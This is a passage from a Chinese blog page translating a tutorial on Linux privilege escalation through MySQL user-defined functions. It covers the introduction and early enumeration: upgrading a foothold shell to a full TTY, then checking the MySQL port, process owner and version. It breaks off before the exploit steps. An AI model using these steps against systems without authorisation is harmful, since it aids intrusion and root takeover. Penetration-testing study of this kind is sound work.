<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Linux 提权/Linux 提权-MySQL UDF" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Linux 提权-MySQL UDF | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-MySQL UDF"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Linux 提权-MySQL UDF | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 MySQL User Defined Functions – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 MySQL User Defined Functions – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-MySQL UDF"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-MySQL UDF" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-MySQL UDF" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://SPYLCPE3W9-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="扛枪的书生" href="/web/opensearch.xml"><link rel="stylesheet" href="/web/assets/css/styles.3453dfb7.css">
<script src="/web/assets/js/runtime~main.799afac8.js" defer="defer"></script>
<script src="/web/assets/js/main.73484f69.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">🛠️软件百宝箱</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/️渗透">🕵️渗透</a><button aria-label="折叠侧边栏分类 &#x27;🕵️渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="折叠侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Capabilities">Linux 提权-Capabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs">Linux 提权-Cron Jobs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Docker 容器">Linux 提权-Docker 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-LXD 容器">Linux 提权-LXD 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-MySQL UDF">Linux 提权-MySQL UDF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-NFS 共享">Linux 提权-NFS 共享</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_1">Linux 提权-SUID_SGID_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2">Linux 提权-SUID_SGID_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1">Linux 提权-Sudo_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2">Linux 提权-Sudo_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-内核利用">Linux 提权-内核利用</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻">Linux 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权指南">Linux 提权指南</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="展开侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">🐧Linux</a><button aria-label="展开侧边栏分类 &#x27;🐧Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">💻Windows</a><button aria-label="展开侧边栏分类 &#x27;💻Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">📦杂项</a><button aria-label="展开侧边栏分类 &#x27;📦杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/️渗透"><span itemprop="name">🕵️渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/linux-提权"><span itemprop="name">Linux 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Linux 提权-MySQL UDF</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Linux 提权-MySQL UDF</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/mysql-user-defined-functions/" target="_blank" rel="noopener noreferrer">MySQL User Defined Functions – Linux Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 什么是用户定义函数 (UDF) ？</a></li>
<li><a href="#id2">2 枚举 UDF 漏洞利用条件</a>
<ul>
<li><a href="#id2.1">2.1 手动枚举 UDF 漏洞利用条件</a>
<ul>
<li><a href="#id2.1.1">2.1.1 寻找数据库凭证</a></li>
</ul>
</li>
<li><a href="#id2.2">2.2 工具枚举 UDF 漏洞利用条件</a></li>
<li><a href="#id2.3">2.3 登录 MySQL 进一步枚举</a></li>
</ul>
</li>
<li><a href="#id3">3 定位、下载和编译 UDF 漏洞</a>
<ul>
<li><a href="#id3.1">3.1 下载 raptor_udf2.c 副本</a></li>
<li><a href="#id3.2">3.2 编译 raptor_udf2.c 副本</a></li>
</ul>
</li>
<li><a href="#id4">4 使用 UDF 漏洞获取 Root Shell</a></li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在本篇文章中，我们将学习如何通过滥用 MySQL 中的用户定义函数 (UDF) 来提升我们在 Linux 目标机上的权限。通过发现一些错误的配置选项并找到 MySQL 数据库的密码，攻击者可以利用 UDF 漏洞从标准用户提升到 root 用户。让我们来看看是如何做到的！</p>
<p>首先，我们将在一台受害 Linux 主机上手动列举该漏洞利用的必要条件。接下来，我们将通过两种不同的方式寻找数据库密码。然后，我们将了解如何利用一款名为 LinPEAS 的优秀工具，自动为我们枚举所有条件，并为我们找到密码。然后，我们将访问 MySQL 数据库并进一步枚举，以确定我们有能力在这台主机上滥用 UDF。最后，我们将制作漏洞利用程序，并按照 C 文件注释中的步骤执行命令，最终获得 root shell。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1什么是用户定义函数-udf"><strong><div id="id1">1、什么是用户定义函数 (UDF)？</div></strong><a href="#1什么是用户定义函数-udf" class="hash-link" aria-label="1什么是用户定义函数-udf的直接链接" title="1什么是用户定义函数-udf的直接链接">​</a></h2>
<p>用户定义函数（即UDF）是一种通过创建或添加像内置 MySQL 函数一样的新函数来扩展 MySQL 功能的方法。</p>
<p>通过使用 UDF，我们可以创建“本地命令”代码，以便在 MySQL 宿主机的操作系统上执行。为此，我们需要编写一个库（通常是 C/C++），将库编译成共享对象，然后将共享对象放入插件目录，最后在 MySQL 中创建一个函数来执行我们的共享对象文件。</p>
<p>作为攻击者，我们需要对此进行分解，并思考如何加以滥用。考虑到我们在 MySQL 内部创建了一个函数，用于在 MySQL 服务宿主机的文件系统上执行命令，我们如何利用这个函数进行恶意攻击应该是显而易见的，尤其是如果我们能以 root 身份执行命令的话。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2枚举-udf-漏洞利用条件"><strong><div id="id2">2、枚举 UDF 漏洞利用条件</div></strong><a href="#2枚举-udf-漏洞利用条件" class="hash-link" aria-label="2枚举-udf-漏洞利用条件的直接链接" title="2枚举-udf-漏洞利用条件的直接链接">​</a></h2>
<p>在此示例中，我们作为标准用户“Juggernaut”在 Linux (Ubuntu 16.04) 目标上获得了立足点。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536157-496006023-2405faf146a46dcc4f066ba2389b862b.png" width="495" height="130" class="img_ev3q"></p>
<p>由于这个 shell 不是使用 SSH 创建的，因此我们在获得立足点后要做的第一件事就是将 shell 升级到完整的 TTY（如果可以的话）。我们可以使用以下命令来完成此操作：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CTRL + Z</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">stty raw -echo;fg</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618184143797-2063917124-9b559547e4b9c380ec4cce137c52251e.png" width="581" height="174" class="img_ev3q">
现在我们有了完整的 TTY，我们可以使用箭头浏览命令历史记录、使用制表符补全、清除终端等。</p>
<blockquote>
<p>当您尝试直接在受害者主机上访问 MySQL 时，上述步骤非常重要。如果您不升级到完整 TTY，您将不会看到密码提示，因为它是交互式的。</p>
<p>这也意味着如果没有完整的 TTY，便无法通过受害主机 Shell 正常登录 MySQL，此时要与该 MySQL 交互就需要通过隧道进行端口转发流量，然后通过攻击机本机的MySQL 客户端进行连接交互。</p>
</blockquote>
<p>完成这一步后，我们就可以开始集中精力进行枚举了。首先，我们将了解如何使用手动方法枚举所需的条件，然后使用 LinPEAS 自动查找所有相同的信息。要确定这种攻击是否可行，我们需要找到很多东西，因此让我们先进行一些手动枚举。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="21手动枚举-udf-漏洞利用条件"><strong><div id="id2.1">2.1、手动枚举 UDF 漏洞利用条件</div></strong><a href="#21手动枚举-udf-漏洞利用条件" class="hash-link" aria-label="21手动枚举-udf-漏洞利用条件的直接链接" title="21手动枚举-udf-漏洞利用条件的直接链接">​</a></h4>
<p>要确定 MySQL 是否可以进行 UDF 攻击，我们需要确定几件事。首先，我们需要确定 MySQL 是否正在运行。默认情况下，MySQL 运行在 3306 端口上，并分配给 localhost (127.0.0.1)。这意味着该服务只能从目标主机本地访问，外部无法访问。不过，如果我们在最初的 nmap 扫描中发现 MySQL 可以从外部访问，那么这一步就已经完成了。</p>
<p>要检查 MySQL 是否正在运行，我们可以使用以下 netstat 命令：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">netstat -tulpn</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536594-345688843-13c55033d850b056a909934aba380266.png" width="793" height="235" class="img_ev3q"></p>
<p>这表明 MySQL 正在目标主机本地运行，因为本地地址是 127.0.0.1。</p>
<p>接下来，我们要找出谁是进程所有者（服务以谁的身份运行）。默认情况下，这将是 &quot;mysql&quot; 服务账户，但也可以将其更改为包括 root 用户在内的任何用户。</p>
<p>我们可以使用以下命令检查服务所有者：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ps -ef | grep mysql</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536166-281763259-979a3251d89019f57241f4a452654145.png" width="934" height="63" class="img_ev3q"></p>
<p>Amazing！我们发现 MySQL 服务（进程）的所有者是 root。这也让我们知道，如果我们能够发现可以通过数据库超级用户访问该数据库并且服务本身也有一些其他错误配置，那么我们就能滥用 UDF，并以 root 身份执行操作系统命令！</p>
<p>好吧，我们发现该服务正在内部运行，并且以 root 身份运行，所以现在我们需要确定正在运行的版本。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql -V</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
